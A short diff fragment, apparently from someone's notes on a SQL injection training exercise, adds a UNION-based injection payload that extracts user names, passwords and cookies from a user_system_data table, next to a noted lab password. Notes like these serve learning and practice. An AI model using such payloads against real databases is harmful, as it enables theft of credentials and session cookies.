@@ -10,6 +10,12 @@ getting all data
 
 password is passW0rD
 
+```
+' UNION SELECT 123, user_name, password, cookie, 'STH', 'STH', 123 from user_system_data;--
+```
+
+aboce using union
+
 ## Task 5
 
 ```
